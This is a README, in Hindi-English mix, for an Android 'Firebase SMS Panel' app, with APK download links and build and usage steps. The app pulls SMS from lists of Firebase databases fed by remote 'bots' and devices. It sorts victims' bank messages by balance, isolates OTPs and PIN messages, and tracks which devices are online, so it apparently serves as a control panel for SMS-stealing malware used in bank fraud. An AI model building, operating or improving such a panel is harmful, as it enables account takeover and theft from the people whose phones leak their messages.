# Firebase SMS Panel (standalone APK)

Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB URLs → HTTPS parallel fetch → device list. Har SMS par **sender ID** clearly.

## Signed APK

**Download (repo release):**  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-signed.apk`

**Signed** (release keystore CI) — phone pe “Install unknown apps” allow karo; production app-store ke liye apni release key use karo.

### Build locally (2 min)

Keystore **GitHub pe upload mat karo** — apne PC par banao:

```bash
cd firebase-sms-panel-app
mkdir -p signing
keytool -genkeypair -v -keystore signing/release.keystore -alias firebasepanel \
  -keyalg RSA -keysize 2048 -validity 10000
cp keystore.properties.example keystore.properties
# keystore.properties me paths + passwords edit karo
./gradlew assembleRelease
```

**Output:** `app/build/outputs/apk/release/app-release.apk` — ye **signed** hai (v2/v3).

Unsigned (agar `keystore.properties` na ho): same path pe build **unsigned** banta hai — Gradle signing optional hai.

Optional (unsigned, agar repo me rakha ho):  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-unsigned.apk`
## Build

1. Android Studio (latest) → **Open** → `firebase-sms-panel-app`
2. Gradle sync → Run / Build APK  
   (Pehli sync pe Gradle wrapper scripts ban sakte hain.)

## Use

1. **TXT** → Firebase URL list wali `.txt` pick karo (newline / mixed text dono).
2. **Fetch Live** → 45s auto-refresh ON + immediate fetch (same filters).
3. **Start Fetch** → dubara pull (URLs load hone ke baad).
4. **Export TXT** → filtered device list share (Telegram/Drive).
5. **Search Here** → device id / Firebase URL / sender / SMS text se filter.
6. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE (filtered set ka max), BANK SMS count, PANELS count; **Live SMS** strip = recent messages across filtered devices (`From:` sender).
7. **Inbox mode (pills)**  
   - **All bank** — saari bank-like SMS (amount band **nahi** — High/Low sort by amount).  
   - **Bank + band** — amount sirf **High→Low 50K–90L** ya **Low→High 2K–50K** ke andar.  
   - **OTP / Jio** — OTP / telco / Jio style alerts (sender ID dikhega).  
   - **Full inbox** — short-link spam hata ke **jo Firebase pe sync ho** (purani + nayi).  
8. **PIN filter** — sirf **Bank** modes par (device par koi PIN-pattern SMS ho to “PIN device”).
9. **Connection** — Online / Offline / Both.  
10. **SMS age** — `1d` … `30d` ya **All (old+new)** — timestamp na ho to bhi message dikhega (purane logs).
11. **Live refresh** — **Fetch Live** = har **45s** par URLs dubara fetch (job ON).
12. Device row tap → bottom sheet: **Firebase URL, device id, sender, body**.

## Data

- Har fetch me zyada SMS lane ke liye deep JSON walk + timeout badhaya; cap ~**8000** SMS/DB (OOM se bachne ke liye).
- **Live** = app ko dubara sync karna; SMS tab dikhenge jab phone/WMS Firebase ko update kare.

## Notes

- Firebase RTDB **public read** hona chahiye warna kuch nahi aayega.
- OTP mode spam short-links hata hai; baaki telco sender IDs match karne ki koshish.
